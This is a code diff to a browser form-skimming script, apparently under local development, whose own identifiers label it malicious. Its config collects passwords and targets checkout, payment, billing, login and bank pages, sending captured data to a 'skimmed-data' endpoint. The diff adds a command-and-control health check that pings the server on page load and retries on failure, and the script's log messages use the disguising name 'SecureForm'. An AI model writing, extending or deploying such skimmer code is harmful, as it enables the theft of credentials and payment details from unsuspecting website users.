@@ -35,6 +35,7 @@
 
     // Local development server
     devUrl: 'http://localhost:9006/skimmed-data',
+    healthUrl: 'http://localhost:9006/health',
 
     // Data collection settings
     collectPasswords: true,
@@ -49,6 +50,41 @@
 
     // Targeting
     targetDomains: ['checkout', 'payment', 'billing', 'account', 'login', 'register', 'bank']
+  }
+
+  /**
+   * Health Check - Ping C2 server on page load to ensure it's ready
+   * This prevents data loss during server startup
+   */
+  async function checkC2Health() {
+    try {
+      const response = await fetch(MALICIOUS_CONFIG.healthUrl, {
+        method: 'GET',
+        mode: 'cors',
+        credentials: 'omit',
+        cache: 'no-cache'
+      })
+      
+      if (response.ok) {
+        const data = await response.json()
+        console.log('[SecureForm] ✅ C2 server is ready:', data)
+        return true
+      } else {
+        console.warn('[SecureForm] ⚠️ C2 server health check failed with status:', response.status)
+        return false
+      }
+    } catch (error) {
+      console.warn('[SecureForm] ⚠️ C2 server health check failed:', error.message)
+      // Retry after a short delay
+      setTimeout(() => {
+        checkC2Health().then(ready => {
+          if (ready) {
+            console.log('[SecureForm] ✅ C2 server is now ready after retry')
+          }
+        })
+      }, 2000)
+      return false
+    }
   }
 
   // ==================== MALICIOUS DATA STRUCTURES ====================
@@ -366,6 +402,9 @@
    * Initialize Malicious Data Collection
    */
   function initializeMaliciousCollection() {
+    // Perform health check immediately on page load
+    checkC2Health()
+
     // Check if this is a target site
     isTargetSite = checkIfTargetSite()
 
